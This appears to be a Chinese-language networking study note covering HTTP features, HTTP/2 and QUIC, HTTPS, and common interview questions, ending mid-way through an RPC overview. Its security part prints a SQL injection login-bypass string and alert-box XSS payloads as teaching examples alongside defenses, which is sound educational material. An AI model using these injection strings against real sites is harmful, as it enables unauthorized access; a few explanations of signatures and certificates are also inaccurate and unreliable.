浏览器发送 `Accept-Encoding` 首部，其中包含有它所支持的压缩算法，以及各自的优先级。服务器则从中选择一种，使用该算法对响应的消息主体进行压缩，并且发送 `Content-Encoding` 首部来告知浏览器它选择了哪一种算法。由于该内容协商过程是基于编码类型来选择资源的展现形式的，响应报文的 Vary 首部字段至少要包含 `Content-Encoding`。

### 范围请求

如果网络出现中断，服务器只发送了一部分数据，范围请求可以使得客户端只请求服务器未发送的那部分数据，从而避免服务器重新发送所有数据。

#### Range

在请求报文中添加 Range 首部字段指定请求的范围。

```http
GET /z4d4kWk.jpg HTTP/1.1
Host: i.imgur.com
Range: bytes=0-1023
```

请求成功的话服务器返回的响应包含 206 Partial Content 状态码。

```http
HTTP/1.1 206 Partial Content
Content-Range: bytes 0-1023/146515
Content-Length: 1024
...
(binary content)
```

#### Accept-Ranges

响应首部字段 Accept-Ranges 用于告知客户端是否能处理范围请求，可以处理使用 bytes，否则使用 none。

```http
Accept-Ranges: bytes
```

#### 响应状态码

- 在请求成功的情况下，服务器会返回 `206 Partial Content` 状态码。
- 在请求的范围越界的情况下，服务器会返回 `416 Requested Range Not Satisfiable` 状态码。
- 在不支持范围请求的情况下，服务器会返回 `200 OK` 状态码。

### 分块传输编码

`Chunked Transfer Encoding`，可以把数据分割成多块，让浏览器逐步显示页面。

### 多部分对象集合

一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。

例如，上传多个表单时可以使用如下方式：

```http
Content-Type: multipart/form-data; boundary=AaB03x

--AaB03x
Content-Disposition: form-data; name="submit-name"

Larry
--AaB03x
Content-Disposition: form-data; name="files"; filename="file1.txt"
Content-Type: text/plain

... contents of file1.txt ...
--AaB03x--
```

### 虚拟主机

HTTP/1.1 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。

### 通信数据转发

#### 代理

代理服务器接受客户端的请求，并且转发给其它服务器。

使用代理的主要目的是：

- 缓存
- 负载均衡
- 网络访问控制
- 访问日志记录

代理服务器分为**正向代理和反向代理**两种：

- 用户察觉得到正向代理的存在。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\forwardagent.png" alt="img" style="zoom:100%;" />
</div>


- 而反向代理一般位于内部网络中，用户察觉不到。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\backwardagent.png" alt="img" style="zoom:100%;" />
</div>


#### 网关

与代理服务器不同的是，网关服务器会将 HTTP 转化为其它协议进行通信，从而请求其它非 HTTP 服务器的服务。

#### 隧道

使用 SSL 等加密手段，在客户端和服务器之间建立一条安全的通信线路。

## HTTP/2.0

### HTTP特点

- 无连接：限制每个连接只处理一个请求。后来出现了Keep-Alive长连接，使客户端到服务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive 功能避免了建立或者重新建立连接
- 无状态：指协议对于事务处理没有记忆能力，服务器不知道客户端是什么状态；即我们给服务器发送 HTTP 请求之后，服务器根据请求，会给我们发送数据过来，但是，发送完，不会记录任何信息。可以通过cookie或者session解决。

### HTTP/1.x缺陷

HTTP/1.x 实现简单是以牺牲性能为代价的：

- 客户端需要**使用多个连接才能实现并发和缩短延迟**；
- **不会压缩请求和响应首部**，从而导致不必要的网络流量；
- **不支持有效的资源优先级**，致使底层 TCP 连接的利用率低下。

### HTTP/1.1新特性

- 默认是长连接
- 支持流水线
- 支持同时打开多个 TCP 连接
- 支持虚拟主机
- 新增状态码 100
- 支持分块传输编码
- 新增缓存处理指令 `max-age`

### 二进制分帧层

HTTP/2.0 将报文分成 HEADERS 帧和 DATA 帧，它们都是二进制格式的。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\http2binarylayer.png" alt="img" style="zoom:60%;" />
</div>


在通信过程中，**只会有一个 TCP 连接存在，它承载了任意数量的双向数据流**（Stream）。

- 一个数据流（Stream）都有一个唯一标识符和可选的优先级信息，用于承载双向信息。
- 消息（Message）是与逻辑请求或响应对应的完整的一系列帧。
- 帧（Frame）是最小的通信单位，来自不同数据流的帧可以交错发送，然后再根据每个帧头的数据流标识符重新组装。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\http2stream.png" alt="img" style="zoom:60%;" />
</div>
### 多路复用

就是一个TCP连接中可以存在多条流，也就是可以发送多个请求，对端可以通过帧中的标识知道属于哪个请求。

### 服务端推送

HTTP/2.0 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。

例如客户端请求 page.html 页面，服务端就把 script.js 和 style.css 等与之相关的资源一起发给客户端。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\http2serverpush.png" alt="img" style="zoom:60%;" />
</div>


### 首部压缩

HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。

HTTP/2.0 要求客户端和服务器同时维护和更新一个包含之前见过的首部字段表，从而避免了重复传输。

不仅如此，HTTP/2.0 也使用 Huffman 编码对首部字段进行压缩。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\http2headerzip.png" alt="img" style="zoom:60%;" />
</div>




## HTTP3.0

### QUIC

（Quick UDP Internet Connections）协议是一种基于UDP的传输层协议，提供像TCP一样的可靠性。可以实现数据传输的0-RTT延迟，并且可以对他的拥塞控制以及流量控制做更多的定制，还提供了传输的安全性保障，以及像HTTP2.0一样的应用数据二进制分帧传输。

#### 自定义连接机制

TCP连接是由四元组标识的，分别是源IP、源端口、目的IP、目的端口，一旦一个元素发生变化，就会断开重连。再次进行三次握手。

基于UDP的QUIC以自己的逻辑维护连接，不再以四元组标识，而是以一个64位的随机数作为ID的标识，而且UDP是无连接的，所以当IP和端口变化的时候，只要ID不变，就不需要重新建立连接。

#### 自定义重传机制

TCP为了保证可靠性，通过使用序号和应答机制，来解决顺序问题和丢包问题。任何一个序号的包发送过去，都要在一定的时间内得到应答，否则一旦超时，就会重发这个包（自适应重传算法）。

QUIC也是用序列号，是递增的，任何一个序列号的包只发送一次，下次就要加1，同时使用offset概念来标识这两个不同序号的包是相同的内容。

#### 无阻塞的多路复用

HTTP2.0中的二进制分帧传输解决了HTTP1.1中的队首阻塞问题，但是HTTP2.0是基于TCP协议的，TCP协议在处理包时是有严格顺序的，当其中一个数据包出现问题，TCP连接需要等待这个包完成重传之后才能继续进行，虽然HTTP2.0通过多个流，使得逻辑上一个TCP连接实现并行进行多路数据的传输，然后这中间没有关联的数据，当前面流的帧没有收到，后面流的帧也会因此堵塞。

同HTTP2.0一样，同一条QUIC连接上可以创建多个stream，来发送多个http请求，但是QUIC是基于UDP的，一个连接上的多个流之间没有依赖，这样假如前面的流丢失了一个UDP包，后面流的包不会因此堵塞可以继续发送。

#### 自定义流量控制

TCP流量控制通过滑动窗口实现。QUIC的流量控制也是如此，但是QUIC窗口是适应自己的多路复用机制的，不但在一个连接上控制窗口，还在一个连接上的每个流控制窗口。

## HTTP 1.0、HTTP 1.1及HTTP 2.0的主要区别是什么

**HTTP 1.0和HTTP 1.1的区别**

- 长连接

  HTTP 1.1支持长连接和请求的流水线操作。长连接是指不在需要每次请求都重新建立一次连接，HTTP 1.0默认使用短连接，每次请求都要重新建立一次TCP连接，资源消耗较大。请求的流水线操作是指客户端在收到HTTP的响应报文之前可以先发送新的请求报文，不支持请求的流水线操作需要等到收到HTTP的响应报文后才能继续发送新的请求报文。

- 缓存处理

  在HTTP 1.0中主要使用header中的If-Modified-Since,Expires作为缓存判断的标准，HTTP 1.1引入了Entity tag，If-Unmodified-Since, If-Match等更多可供选择的缓存头来控制缓存策略。

- 错误状态码

  在HTTP 1.1新增了24个错误状态响应码

- HOST域

  在HTTP 1.0 中认为每台服务器都会绑定唯一的IP地址，所以，请求中的URL并没有传递主机名。但后来一台服务器上可能存在多个虚拟机，它们共享一个IP地址，所以HTTP 1.1中请求消息和响应消息都应该支持Host域。

- 带宽优化及网络连接的使用

  在HTTP 1.0中会存在浪费带宽的现象，主要是因为不支持断点续传功能，客户端只是需要某个对象的一部分，服务端却将整个对象都传了过来。在HTTP 1.1中请求头引入了range头域，它支持只请求资源的某个部分，返回的状态码为206。

**HTTP 2.0的新特性**

- 新的二进制格式：HTTP 1.x的解析是基于文本，HTTP 2.0的解析采用二进制，实现方便，健壮性更好。
- 多路复用：每一个request对应一个id，一个连接上可以有多个request，每个连接的request可以随机混在一起，这样接收方可以根据request的id将request归属到各自不同的服务端请求里。
- header压缩：在HTTP 1.x中，header携带大量信息，并且每次都需要重新发送，HTTP 2.0采用编码的方式减小了header的大小，同时通信双方各自缓存一份header fields表，避免了header的重复传输。
- 服务端推送：客户端在请求一个资源时，会把相关资源一起发给客户端，这样客户端就不需要再次发起请求。

## HTTP 如何实现长连接？在什么时候会超时？

通过在http头部（请求和响应头）设置Connection：keep-alive，HTTP1.0协议支持，但是默认关闭，从HTTP1.1协议以后，连接默认是长连接。

1. HTTP一般会有httpd守护进程，里面可以设置keep-alive timeout，当tcp连接闲置超过这个时间后就会关闭，也可以在HTTP的header里面设置超时时间。
2. TCP的keep-alive包含三个参数，支持在系统内核的net.ipv4里面设置：当TCP连接之后，闲置了tcp_keeplive_time，则会发生侦测包，如果没有收到对方的ACK，那么每隔tcp_keepalive_intvl再发一次，直到发送了tcp_keepalive_probes，就会丢弃该链接。

​	（1）tcp_keepalive_intvl=15

​	（2）tcp_keepalive_probes=5

​	（3）tcp_keeplive_time=1800

实际上HTTP没有长短链接，只有TCP有，TCP长连接可以复用一个TCP链接来发出多次HTTP请求，这样可以减少资源消耗，比如一次请求HTML，还可以请求后续的资源。

## HTTPS

### http和https的区别

1、HTTPS需要到CA申请证书，HTTP不需要

2、HTTPS密文传输、HTTP明文传输

3、连接方式不同，HTTPS默认使用443端口，HTTP使用80端口

4、HTTPS = HTTP + 加密+认证+完整性保护，较HTTP安全

**HTTP有以下安全性问题**：

- 使用明文进行通信，内容可能被窃听；
- 不验证通信方的身份，通信方的身份有可能遭遇伪装；
- 无法证明报文的完整性，报文有可能遭篡改

HTTPS 并不是新协议，而是让 `HTTP `先和 `SSL（Secure Sockets Layer）`通信，再由 SSL 和 TCP 通信，也就是说 HTTPS 使用了隧道进行通信。

通过使用 SSL，HTTPS 具有了**加密（防窃听）**、**认证（防伪装）**和**完整性保护（防篡改）**。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\ssl-offloading.png" alt="img" style="zoom:60%;" />
</div>


### 加密

#### 对称密钥加密

对称密钥加密（Symmetric-Key Encryption），加密和解密使用同一密钥。

- 优点：运算速度快；
- 缺点：无法安全地将密钥传输给通信方。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\samekey.png" alt="img" style="zoom:60%;" />
</div>


#### 非对称密钥加密

非对称密钥加密，又称公开密钥加密（Public-Key Encryption），加密和解密使用不同的密钥。

公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。

非对称密钥除了用来加密，还可以用来进行签名。因为私有密钥无法被其他人获取，因此通信发送方使用其私有密钥进行签名，通信接收方使用发送方的公开密钥对签名进行解密，就能判断这个签名是否正确。

- 优点：可以更安全地将公开密钥传输给通信发送方；
- 缺点：运算速度慢。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\publickey.png" alt="img" style="zoom:60%;" />
</div>
#### HTTPS采用的加密方式

上面提到对称密钥加密方式的传输效率更高，但是无法安全地将密钥 Secret Key 传输给通信方。而非对称密钥加密方式可以保证传输的安全性，因此我们可以利用非对称密钥加密方式将 Secret Key 传输给通信方。HTTPS 采用混合的加密机制，正是利用了上面提到的方案：

- 使用非对称密钥加密方式，传输对称密钥加密方式所需要的 Secret Key，从而保证安全性;
- 获取到 Secret Key 后，再使用对称密钥加密方式进行通信，从而保证效率。（下图中的 Session Key 就是 Secret Key）
- 具体流程为：
  - 客户端请求建立HTTPS连接
  - 服务端向客户端发送`Public Key`（公钥）
  - 客户端生成`session key`（会话密钥），并使用`public key`对`session key`进行加密
  - 将加密之后的`session key`发送给服务端
  - 服务端使用`private key`（私钥）对加密后的`session key`进行解密
  - 双方使用`session key`进行加密传输

### 认证

通过使用 **证书** 来对通信方进行认证。

数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。

服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。

进行 HTTPS 通信时，服务器会把证书发送给客户端。客户端取得其中的公开密钥之后，先使用数字签名进行验证，如果验证通过，就可以开始通信了。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\ca.png" alt="img" style="zoom:80%;" />
</div>


### 完整性保护

SSL 提供报文摘要功能来进行完整性保护。

HTTP 也提供了 MD5 报文摘要功能，但不是安全的。例如报文内容被篡改之后，同时重新计算 MD5 的值，通信接收方是无法意识到发生了篡改。

HTTPS 的报文摘要功能之所以安全，是因为它**结合了加密和认证**这两个操作。试想一下，加密之后的报文，遭到篡改之后，也很难重新计算报文摘要，因为无法轻易获取明文。

### HTTPS的缺点

- 因为需要加密解密等过程，因此速度很慢
- 需要支付证书授权的高额费用

#### 什么是数字签名？

为了避免数据在传输过程中被替换，比如黑客修改了你的报文内容，但是你并不知道，所以我们让发送端做一个数字签名，把数据的摘要消息进行一个加密，比如 MD5，得到一个签名，和数据一起发送。然后接收端把数据摘要进行 MD5 加密，如果和签名一样，则说明数据确实是真的。

#### 什么是数字证书？

对称加密中，双方使用公钥进行解密。虽然数字签名可以保证数据不被替换，但是数据是由公钥加密的，如果公钥也被替换，则仍然可以伪造数据，因为用户不知道对方提供的公钥其实是假的。所以为了保证发送方的公钥是真的，CA 证书机构会负责颁发一个证书，里面的公钥保证是真的，用户请求服务器时，服务器将证书发给用户，这个证书是经由系统内置证书的备案的。

## 输入一个URL之后发生了什么？

### 简单版

1、首先，在浏览器地址栏中输入url，先解析url，检测url地址是否合法

2、浏览器先查看浏览器缓存-系统缓存-路由器缓存，如果缓存中有，会直接在屏幕中显示页面内容。若没有，则跳到第三步操作。

​		浏览器缓存：浏览器会记录DNS一段时间，因此，只是第一个地方解析DNS请求；

​		操作系统缓存：如果在浏览器缓存中不包含这个记录，则会使系统调用操作系统，获取操作系统的记录(保存最近的DNS查询缓存)；

​		路由器缓存：如果上述两个步骤均不能成功获取DNS记录，继续搜索路由器缓存；

​		ISP缓存：若上述均失败，继续向ISP搜索。

3、在发送http请求前，需要域名解析(DNS解析)，解析获取相应的IP地址。

4、浏览器向服务器发起tcp连接，与浏览器建立tcp三次握手。

5、握手成功后，浏览器向服务器发送http请求，请求数据包。

6、服务器处理收到的请求，将数据返回至浏览器

7、浏览器收到HTTP响应

8、浏览器解码响应，如果响应可以缓存，则存入缓存。

9、 浏览器发送请求获取嵌入在HTML中的资源（html，css，javascript，图片，音乐······），对于未知类型，会弹出对话框。

10、 浏览器发送异步请求。

11、页面全部渲染结束。

## URI和 URL之间的区别

URL，即统一资源定位符 (Uniform Resource Locator )，URL 其实就是我们平时上网时输入的网址，它标识一个互联网资源，并指定对其进行操作或获取该资源的方法。例如 https://leetcode-cn.com/problemset/all/ 这个 URL，标识一个特定资源并表示该资源的某种形式是可以通过 HTTP 协议从相应位置获得。

而 URI 则是统一资源标识符，URL 是 URI 的一个子集，两者都定义了资源是什么，而 URL 还定义了如何能访问到该资源。URI 是一种语义上的抽象概念，可以是绝对的，也可以是相对的，而URL则必须提供足够的信息来定位，是绝对的。简单地说，只要能唯一标识资源的就是 URI，在 URI 的基础上给出其资源的访问方式的就是 URL。

## IPV4 地址不够如何解决

目前主要有以下两种方式：

1、其实我们平时上网，电脑的 IP 地址都是属于私有地址，我无法出网关，我们的数据都是通过网关来中转的，这个其实 NAT 协议，可以用来暂缓 IPV4 地址不够。

2、IPv6 ：作为接替 IPv4 的下一代互联网协议，其可以实现 2 的 128 次方个地址，而这个数量级，即使是给地球上每一颗沙子都分配一个IP地址，该协议能够从根本上解决 IPv4 地址不够用的问题。

# 计算机网络之常见面试题

## 什么是SQL 注入？举个例子？

SQL注入就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。

1). SQL注入攻击的总体思路

　　(1). 寻找到SQL注入的位置
　　(2). 判断服务器类型和后台数据库类型
　　(3). 针对不同的服务器和数据库特点进行SQL注入攻击

2). SQL注入攻击实例

比如，在一个登录界面，要求输入用户名和密码，可以这样输入实现免帐号登录：

```shell
用户名： ‘or 1 = 1 --
密 码：
```

用户一旦点击登录，如若没有做特殊处理，那么这个非法用户就很得意的登陆进去了。这是为什么呢?

下面我们分析一下：从理论上说，后台认证程序中会有如下的SQL语句：

```sql
String sql = “select * from user_table where username=’ “+userName+” ’ and password=’ “+password+” ‘”;
```

因此，当输入了上面的用户名和密码，上面的SQL语句变成：

```java
SELECT * FROM user_table WHERE username=’’or 1 = 1 –- and password=’’
```

分析上述SQL语句我们知道，username=‘ or 1=1 这个语句一定会成功；然后后面加两个 -，这意味着注释，它将后面的语句注释，让他们不起作用。这样，上述语句永远都能正确执行，用户轻易骗过系统，获取合法身份。

3). 应对方法

(1). 参数绑定

使用预编译手段，绑定参数是最好的防SQL注入的方法。目前许多的ORM框架及JDBC等都实现了SQL预编译和参数绑定功能，攻击者的恶意SQL会被当做SQL的参数而不是SQL命令被执行。在mybatis的mapper文件中，对于传递的参数我们一般是使用 # 和`$`来获取参数值。

当使用#时，变量是占位符，就是一般我们使用javajdbc的PrepareStatement时的占位符，所有可以防止sql注入；当使用`$`时，变量就是直接追加在sql中，一般会有sql注入问题。

(2). 使用正则表达式过滤传入的参数

## 谈一谈 XSS 攻击，举个例子？

XSS是一种经常出现在web应用中的计算机安全漏洞，与SQL注入一起成为web中最主流的攻击方式。

XSS是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些脚本代码嵌入到web页面中去，使别的用户访问都会执行相应的嵌入代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。

###  原因解析

主要原因：过于信任客户端提交的数据！

解决办法：不信任任何客户端提交的数据，只要是客户端提交的数据就应该先进行相应的过滤处理然后方可进行下一步的操作。

进一步分析细节：客户端提交的数据本来就是应用所需要的，但是恶意攻击者利用网站对客户端提交数据的信任，在数据中插入一些符号以及javascript代码，那么这些数据将会成为应用代码中的一部分了，那么攻击者就可以肆无忌惮地展开攻击啦，因此我们绝不可以信任任何客户端提交的数据！！！

###  XSS 攻击分类

(1). 反射性XSS攻击 (非持久性XSS攻击)

漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS攻击包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)，例如，正常发送消息：

```java
http://www.test.com/message.php?send=Hello,World！
```

接收者将会接收信息并显示Hello,World；但是，非正常发送消息：

```java
http://www.test.com/message.php?send=<script>alert(‘foolish!’)</script>！
```

接收者接收消息显示的时候将会弹出警告窗口！

(2). 持久性XSS攻击 (留言板场景)

XSS攻击向量(一般指XSS攻击代码)存储在网站数据库，当一个页面被用户打开的时候执行。也就是说，每当用户使用浏览器打开指定页面时，脚本便执行。

与非持久性XSS攻击相比，持久性XSS攻击危害性更大。从名字就可以了解到，持久性XSS攻击就是将攻击代码存入数据库中，然后客户端打开时就执行这些攻击代码。

例如，留言板表单中的表单域：

```markup
<input type="text" name="content" value="这里是用户填写的数据">
```

正常操作流程是：用户是提交相应留言信息 —— 将数据存储到数据库 —— 其他用户访问留言板，应用去数据并显示；而非正常操作流程是攻击者在value填写:

```markup
<script>alert(‘foolish!’)；</script> <!--或者html其他标签（破坏样式。。。）、一段攻击型代码-->
```

并将数据提交、存储到数据库中；当其他用户取出数据显示的时候，将会执行这些攻击性代码。

4). 修复漏洞方针

漏洞产生的根本原因是 太相信用户提交的数据，对用户所提交的数据过滤不足所导致的，因此解决方案也应该从这个方面入手，具体方案包括：

将重要的cookie标记为http only, 这样的话Javascript 中的document.cookie语句就不能获取到cookie了（如果在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击）；

表单数据规定值的类型，例如：年龄应为只能为int、name只能为字母数字组合。。。。

对数据进行Html Encode 处理

过滤或移除特殊的Html标签，例如: < script >, < iframe > , < for <, > for>, ” for

过滤JavaScript 事件的标签，例如 “οnclick=”, “onfocus” 等等。

需要注意的是，在有些应用中是允许html标签出现的，甚至是javascript代码出现。因此，我们在过滤数据的时候需要仔细分析哪些数据是有特殊要求（例如输出需要html代码、javascript代码拼接、或者此表单直接允许使用等等），然后区别处理！

## 简单说下 SYN FLOOD 是什么

SYN Flood 又称 SYN 洪水攻击，也是拒绝服务攻击的一种，是一种曾经很经典的攻击方式。攻击者利用TCP协议的安全缺陷，不断发送一系列的SYN请求到目标系统，消耗服务器系统的资源，从而导致目标服务器不响应合法流量请求。

在谈SYN flood 之前，我们先了解一下一次正常的网络请求都有哪些步骤，从而更清晰的了解SYN Flood的攻击方式。

一般一次正常的网络请求分以下几个步骤：

- 域名解析
- TCP握手建立链接
- 客户端发起请求
- 服务器响应请求
- 客户端解析并且渲染页面
- 至此一次请求结束。

而此种攻击正是发生在TCP握手的阶段。TCP握手一般分为三步。客户端发送SYN请求数据包。服务器回复（ACK）确认包。客户端再次回复（ACK）确认包。至此，TCP握手阶段结束。

![image-20210910003906299](https://gitee.com/iamshuaidi/picture/raw/master/picture/image-20210910003906299.png)



### **SYN Flood / SYN 洪水攻击原理**

为了创建拒绝服务，攻击者利用的正是TCP协议的安全缺陷。在接收到初始SYN数据包之后，服务器用一个或多个SYN / ACK数据包进行响应，并等待握手中的最后一步。这是它的工作原理。

此种攻击是攻击者向目标服务器发送大量的SYN数据包，服务器会响应每一个请求然后返回ACK确认包，并且等待客户端的最终响应。

因为攻击者通常会采用虚拟ip，所以也就意味着服务器永远不可能接收到最终的确认包。这种情况下当服务器未接收到最终ACK数据包的时候，服务端一般会重试（再次发送SYN+ACK给客户端）并等待一段时间后丢弃这个未完成的连接。

这段时间的长度我们称为SYN Timeout，一般来说这个时间是分钟的数量级（大约为30秒-2分钟）；一个用户出现异常导致服务器的一个线程等待1分钟并不是什么很大的问题，但如果有一个恶意的攻击者大量模拟这种情况（伪造IP地址），那么服务器端将为了维护一个非常大的半连接列表而消耗非常多的资源。从而造成服务器的崩溃，即使你的服务器系统资源够强大，服务端也将忙于处理攻击者伪造的TCP连接请求而无暇理睬客户的正常请求（毕竟客户端的正常请求比率非常之小）。

此时，正常用户就会觉得服务器失去响应，这种情况就叫做，服务端收到了SYN Flood攻击（SYN 洪水攻击）。

![image-20210910004026011](https://gitee.com/iamshuaidi/picture/raw/master/picture/image-20210910004026011.png)

在网络中，当服务器断开连接但连接另一端的客户端没有断开连接时，连接被认为是半开的。在这种类型的DDoS攻击中，目标服务器不断离开打开的连接，等待每个连接超时，然后端口再次可用。所以这种攻击也可以被认为是“半开攻击”。

## 什么是 DoS、DDoS、DRDoS 攻击？

- **DOS**: (Denial of Service),中文名称是拒绝服务,一切能引起 DOS 行为的攻击都被称为 DOS 攻击。最常见的 DoS 攻击有计算机网络宽带攻击和连通性攻击。
- **DDoS**: (Distributed Denial of Service),中文名称是分布式拒绝服务。是指处于不同位置的多个攻击者同时向一个或数个目标发动攻击，或者一个攻击者控制了位于不同位置的多台机器并利用这些机器对受害者同时实施攻击。常见的 DDos 有 SYN Flood、Ping of Death、ACK Flood、UDP Flood 等。
- **DRDoS**: (Distributed Reflection Denial of Service)，中文名称是分布式反射拒绝服务，该方式靠的是发送大量带有被害者 IP 地址的数据包给攻击主机，然后攻击主机对 IP 地址源做出大量回应，形成拒绝服务攻击。

## 什么是 CSRF 攻击，如何避免

**什么是 CSRF 攻击？**

CSRF，跨站请求伪造（英语：Cross-site request forgery），简单点说就是，攻击者盗用了你的身份，以你的名义发送恶意请求。跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。

**CSRF 是如何攻击的呢？**

我们来看下这个例子哈（来自百度百科）



![img](https://static001.geekbang.org/infoq/ee/ee0c10194428e051203616276a9ff8b3.png)



- Tom 登陆银行，没有退出，浏览器包含了 Tom 在银行的身份认证信息。
- 黑客 Jerry 将伪造的转账请求，包含在在帖子
- Tom 在银行网站保持登陆的情况下，浏览帖子
- 将伪造的转账请求连同身份认证信息，发送到银行网站
- 银行网站看到身份认证信息，以为就是 Tom 的合法操作，最后造成 Tom 资金损失。

**如何解决 CSRF 攻击**

- 检查 Referer 字段。HTTP 头中有一个 Referer 字段，这个字段用以标明请求来源于哪个地址。
- 添加校验 token。

## MTU和MSS

- `MTU: maximum transmission unit`，最大传输单元，由硬件规定，即物理接口（数据链路层）提供给上层最大一次传输数据的大小，比如以太网的MTU为1500字节。
- `MSS: maximum segment size`，最大分节大小，为TCP数据包每次传输的最大数据分段大小，一般由发送端向对端TCP通知对端在每个分节中能发送的TCP数据。一般`MSS=MTU-IPv4Header(20Bytes)-TCPHeader(20Bytes)`

## web项目中用户登陆的流程

- 前端发送公钥的请求
- 后台生成公钥私钥对，将公钥返回前端，私钥保存在session中
- 前端拿到公钥之后，对用户输入的密码进行md5加密，然后再对（md5加密后的密码+密码明文）进行RSA公钥加密，同时发起登陆请求，POST方式，将用户名和加密后的密码传入后台进行校验
- 后台接收到加密后的密码首先利用私钥对密码解密
- 对密码进行完成的校验（MD5校验）
- 校验通过后进行登陆验证工作，查询数据库验证用户名和密码
- 验证通过之后检查该用户在其他地方是否登陆。方法为自定义一个session的缓存将登陆过的session与用户名存入map中，从缓存中获取此用户名对应的缓存判断sessionid是否一致，如果不一致说明此次登陆为重复登陆，将之前的session剔除
- 返回登陆结果到前端

# RPC框架

## 简介

RPC，全称为Remote Procedure Call，即远程过程调用，是一种计算机通信协议。
 比如现在有两台机器：A机器和B机器，并且分别部署了应用A和应用B。假设此时位于A机器上的A应用想要调用位于B机器上的B应用提供的函数或是方法，由于A应用和B应用不在一个内存空间里面，所以不能直接调用，此时就需要通过网络来表达调用的方式和传输调用的数据。也即所谓的远程调用。

## 实现原理

1、建立通信

首先要解决通讯的问题：即A机器想要调用B机器，首先得建立起通信连接。主要是通过在客户端和服务器之间建立TCP连接，远程过程调用的所有相关的数据都在这个连接里面进行传输交换。

通常这个连接可以是按需连接（`需要调用的时候就先建立连接，调用结束后就立马断掉`），也可以是长连接（`客户端和服务器建立起连接之后保持长期持有，不管此时有无数据包的发送，可以配合心跳检测机制定期检测建立的连接是否存活有效`），多个远程过程调用共享同一个连接。

2、服务寻址

解决寻址的问题：即A机器上的应用A要调用B机器上的应用B，那么此时对于A来说如何告知底层的RPC框架所要调用的服务具体在哪里呢？

**通常情况下我们需要提供B机器（主机名或IP地址）以及特定的端口，然后指定调用的方法或者函数的名称以及入参出参等信息，这样才能完成服务的一个调用。**比如基于Web服务协议栈的RPC，就需要提供一个endpoint URI，或者是从UDDI服务上进行查找。如果是RMI调用的话，还需要一个RMI Registry来注册服务的地址。

3、网络传输

3.1、序列化

当A机器上的应用发起一个RPC调用时，调用方法和其入参等信息需要通过底层的网络协议如TCP传输到B机器，由于网络协议是基于二进制的，所有我们传输的参数数据都需要先进行序列化（Serialize）或者编组（marshal）成二进制的形式才能在网络中进行传输。然后通过寻址操作和网络传输将序列化或者编组之后的二进制数据发送给B机器。

3.2、反序列化

当B机器接收到A机器的应用发来的请求之后，又需要对接收到的参数等信息进行反序列化操作（序列化的逆操作），即将二进制信息恢复为内存中的表达方式，然后再找到对应的方法（寻址的一部分）进行本地调用（一般是通过生成代理Proxy去调用, 通常会有JDK动态代理、CGLIB动态代理、Javassist生成字节码技术等），之后得到调用的返回值。

4、服务调用

B机器进行本地调用（通过代理Proxy）之后得到了返回值，此时还需要再把返回值发送回A机器，同样也需要经过序列化操作，然后再经过网络传输将二进制数据发送回A机器，而当A机器接收到这些返回值之后，则再次进行反序列化操作，恢复为内存中的表达方式，最后再交给A机器上的应用进行相关处理（一般是业务逻辑处理操作）。

通常，经过以上四个步骤之后，一次完整的RPC调用算是完成了，另外可能因为网络抖动等原因需要重试等。

## 为什么需要RPC？

主要就是因为在几个进程内（应用分布在不同的机器上），无法共用内存空间，或者在一台机器内通过本地调用无法完成相关的需求，比如不同的系统之间的通讯，甚至不同组织之间的通讯。此外由于机器的横向扩展，需要在多台机器组成的集群上部署应用等等。

## **RPC和HTTP区别**
RPC 和 HTTP都是微服务间通信较为常用的方案之一，其实RPC 和 HTTP 并不完全是同一个层次的概念，它们之间还是有所区别的。
1. RPC 是远程过程调用，其调用协议通常包括序列化协议和传输协议。序列化协议有基于纯文本的 XML 和 JSON、二进制编码的Protobuf和Hessian。传输协议是指其底层网络传输所使用的协议，比如 TCP、HTTP。

2. 可以看出HTTP是RPC的传输协议的一个可选方案，比如说 gRPC 的网络传输协议就是 HTTP。HTTP 既可以和 RPC 一样作为服务间通信的解决方案，也可以作为 RPC 中通信层的传输协议（此时与之对比的是 TCP 协议）。

## RPC的实现基础

```undefined
1、需要有非常高效的网络通信，比如一般选择Netty作为网络通信框架
2、需要有比较高效的序列化框架，比如谷歌的Protobuf序列化框架
3、可靠的寻址方式（主要是提供服务的发现），比如可以使用Zookeeper来注册服务等等
4、如果是带会话（状态）的RPC调用，还需要有会话和状态保持的功能
```

## RPC的调用过程

### 一个基本的RPC架构里面应该至少包含以下4个组件：

```undefined
1、客户端（Client）:服务调用方（服务消费者）
2、客户端存根（Client Stub）:存放服务端地址信息，将客户端的请求参数数据信息打包成网络消息，再通过网络传输发送给服务端
